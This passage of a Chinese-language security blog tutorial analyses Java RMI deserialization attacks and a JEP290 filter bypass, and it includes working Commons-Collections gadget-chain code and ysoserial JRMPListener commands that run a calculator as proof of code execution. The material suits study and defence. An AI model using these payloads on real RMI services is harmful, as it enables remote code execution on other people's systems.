3333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16080250108100.jpg" alt="-w1792"></p>
<p>可以看到，即使报了字符转换的<code>error</code>，还是利用成功了。</p>
<p>除了这种伪造请求，还可以<code>rasp hook请求代码，修改发送数据</code>进行利用，现在还没接触过rasp，就先不复现了。</p>
<h3 id="二、注册中心攻击客户端与服务端"><a href="#二、注册中心攻击客户端与服务端" class="headerlink" title="二、注册中心攻击客户端与服务端"></a>二、注册中心攻击客户端与服务端</h3><p>从上面的代码中也可以看出来，客户端和服务端与注册中心的参数交互都是把数据序列化和反序列化来进行的，那这个过程中肯定也是存在一个对注册中心返回的数据的反序列化的处理，这个地方也存在反序列化漏洞风险。(详细分析可以看Bypass JEP290部分)</p>
<p>可以用ysoserial生成一个恶意的注册中心，当调用注册中心的方法时，就可以进行恶意利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener <span class="number">12345</span> CommonsCollections1 <span class="string">&#x27;open /System/Applications/Calculator.app&#x27;</span></span><br></pre></td></tr></table></figure>

<p>开启注册中心：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16080397443633.jpg" alt="-w855"></p>
<p>客户端测试代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SimpleRMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserClientEval</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行了之后就可以看到命令执行成功了。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16080398576473.jpg" alt="-w1790"></p>
<p>除了<code>list()</code>之外，其余的操作都可以进行利用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">list()</span><br><span class="line">bind()</span><br><span class="line">rebind()</span><br><span class="line">unbind()</span><br><span class="line">lookup()</span><br></pre></td></tr></table></figure>

<p>例如<code>bind()</code>：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16080401216090.jpg" alt="-w1792"></p>
<h3 id="三、客户端攻击服务端"><a href="#三、客户端攻击服务端" class="headerlink" title="三、客户端攻击服务端"></a>三、客户端攻击服务端</h3><p>如果注册服务的对象接收一个参数为对象，那么可以传递一个恶意对象进行利用。比如这里可以传递一个Common-collection3.1反序列化漏洞poc构造出的一个恶意对象作为参数利用：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16080993649366.jpg" alt="-w900"></p>
<p>POC：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eval_rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:3333/User&quot;</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url);</span><br><span class="line">        System.out.println(userClient.name(<span class="string">&quot;test&quot;</span>));</span><br><span class="line">        userClient.say(<span class="string">&quot;world&quot;</span>);<span class="comment">// 这里会在server端输出</span></span><br><span class="line">        userClient.dowork(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器端会执行命令：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16076913110297.jpg" alt="-w1787"></p>
<h3 id="四、服务端攻击客户端"><a href="#四、服务端攻击客户端" class="headerlink" title="四、服务端攻击客户端"></a>四、服务端攻击客户端</h3><p>跟客户端攻击服务端一样，在客户端调用一个远程方法时，只需要控制返回的对象是一个恶意对象就可以进行反序列化漏洞的利用了。这里我在原来RMI测试例子的基础上加了一个<code>getwork()</code>方法。</p>
<p>UserImpl.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SimpleRMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;you speak&quot;</span> + say);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;your work is &quot;</span> + work);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getwork</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        Object evalObject = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Threezh1&quot;</span>);</span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">            Class AnnotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            evalObject = cons.newInstance(java.lang.annotation.Retention.class, outerMap);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> evalObject;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开启<code>Server</code>之后，在<code>Client</code>端调用<code>getwork()</code>方法即可以攻击成功。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16081012833911.jpg" alt="-w1790"></p>
<h2 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h2><h3 id="什么是JEP290？"><a href="#什么是JEP290？" class="headerlink" title="什么是JEP290？"></a>什么是JEP290？</h3><p>JEP290是来限制能够被反序列化的类，主要包含以下几个机制：</p>
<ol>
<li>提供一个限制反序列化类的机制，白名单或者黑名单。</li>
<li>限制反序列化的深度和复杂度。</li>
<li>为RMI远程调用对象提供了一个验证类的机制。</li>
<li>定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。</li>
</ol>
<p>JEP290支持的版本：</p>
<ul>
<li>Java™ SE Development Kit 8, Update 121 (JDK 8u121)</li>
<li>Java™ SE Development Kit 7, Update 131 (JDK 7u131)</li>
<li>Java™ SE Development Kit 6, Update 141 (JDK 6u141)</li>
</ul>
<p>JEP290需要手动设置，只有设置了之后才会有过滤，没有设置的话就还是可以正常的反序列化漏洞利用。所以如果是Client端和Server端互相攻击是没有过滤的。</p>
<p>设置JEP290的方式有下面两种：</p>
<ol>
<li>通过setObjectInputFilter来设置filter</li>
<li>直接通过conf/security/java.properties文件进行配置 <a target="_blank" rel="noopener" href="http://openjdk.java.net/jeps/290">参考</a></li>
</ol>
<h3 id="Bypass-JEP290"><a href="#Bypass-JEP290" class="headerlink" title="Bypass JEP290"></a>Bypass JEP290</h3><h4 id="Registry通过setObjectInputFilter来设置filter过程分析"><a href="#Registry通过setObjectInputFilter来设置filter过程分析" class="headerlink" title="Registry通过setObjectInputFilter来设置filter过程分析"></a>Registry通过setObjectInputFilter来设置filter过程分析</h4><p>测试环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDK 8u131</span><br></pre></td></tr></table></figure>

<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServerEval</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Threezh1&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class AnnotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);</span><br><span class="line">        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123; Remote.class &#125;, evalObject));</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">3333</span>);</span><br><span class="line">        Registry registry_remote = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>);</span><br><span class="line">        registry_remote.bind(<span class="string">&quot;HelloRegistry&quot;</span>, proxyEvalObject);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi start at 3333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在创建注册中心过程中存在一个<code>setObjectInputFilter</code>的过程，因此在客户端(这里代表Server和Client端)攻击注册中心过程中会被过滤。比如这里我给注册中心绑定了一个<code>Common-collection5</code>的恶意对象，结果是报错了，报错信息为：<code>filter status REJECTED</code>。说明传入的恶意对象被拦截了。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16081928894978.jpg" alt="-w1860"></p>
<p>接着来跟一下注册中心创建的流程，看看<code>setObjectInputFilter</code>的过程到底是怎么样的。</p>
<p>首先到了<code>RegistryImpl</code>方法处，可以看到，实例化<code>UnicastServerRef</code>时第二个参数传入的是<code>RegistryImpl::registryFilter</code>。传入之后的值赋值给了<code>this.Filter</code></p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082110160180.jpg" alt="-w1000"></p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082128916769.jpg" alt="-w1000"></p>
<p>看一下<code>registryFilter</code>这个方法：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082115406494.jpg" alt="-w1000"></p>
<p>这里的<code>registryFilter</code>默认为null，可以先不管这个判断，后面返回的内容相当于配置了一个白名单，当传入的类不属于白名单的内容时，则会返回<code>REJECTED</code>，否则就会返回<code>ALLOWED</code>。白名单如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String.class</span><br><span class="line">Number.class</span><br><span class="line">Remote.class</span><br><span class="line">Proxy.class</span><br><span class="line">UnicastRef.class</span><br><span class="line">RMIClientSocketFactory.class</span><br><span class="line">RMIServerSocketFactory.class</span><br><span class="line">ActivationID.class</span><br><span class="line">UID.class</span><br></pre></td></tr></table></figure>

<p>在<code>bind()</code>操作请求后，注册中心的接收端会调用oldDispatch方法，文件地址：<code>jdk1.8.0_131.jdk/Contents/Home/jre/lib/rt.jar!/sun/rmi/server/UnicastServerRef.class</code>。最终是会去调用<code>this.skel.dispatch</code>去绑定服务的。在这句之前有一个<code>this.unmarshalCustomCallData(var18);</code>跟入进去看看。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16081972707134.jpg" alt="-w900"></p>
<p>可以看到在这里调用了<code>Config.setObjectInputFilter</code>设置了过滤。<code>UnicastServerRef.this.filter</code>就是之前实例化<code>UnicastServerRef</code>时所设置的。规则就是之前所说的白名单，不属于那个白名单的类就不允许被反序列化。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16081973557949.jpg" alt="-w900"></p>
<p>那这个过程其实就是<code>Registry</code>在处理请求的过程中设置了一个过滤器来防范注册中心被反序列化漏洞攻击。有过滤就有绕过，这里的绕过方式是什么样的呢？</p>
<h4 id="Bypass-复现"><a href="#Bypass-复现" class="headerlink" title="Bypass 复现"></a>Bypass 复现</h4><ol>
<li>用<code>ysoserial</code>启动一个恶意的<code>JRMPListener</code>(<code>CommonCollections1</code>的链在1.8下用不了，所以这里用了<code>CommonCollections5</code>的)</li>
<li>启动注册中心</li>
<li>启动Client调用<code>bind()</code>操作</li>
<li>注册中心被反序列化攻击</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 &quot;open -a Calculator&quot;</span><br></pre></td></tr></table></figure>

<p>UserServer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">2222</span>);</span><br><span class="line">        User user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        registry.rebind(<span class="string">&quot;HelloRegistry&quot;</span>, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi start at 2222&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TestClient.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span 